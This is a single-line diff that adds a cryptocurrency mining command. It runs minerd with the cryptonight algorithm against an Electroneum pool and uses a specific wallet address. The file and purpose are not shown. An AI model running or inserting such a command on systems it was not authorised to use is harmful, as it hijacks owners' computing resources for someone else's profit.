@@ -1,0 +1,1 @@
+minerd -a cryptonight -o stratum+tcp://pool.electroneum.space:3333 -u etnjxdGZUWzF7SwFF4pgbzgb8EnqtHJL3bfvfj2i75DRJLnrwdotNTkXm1VAWzZcoKCGABwjNzbGhez2vE5xVe4v1xPiNmtoqv -p x
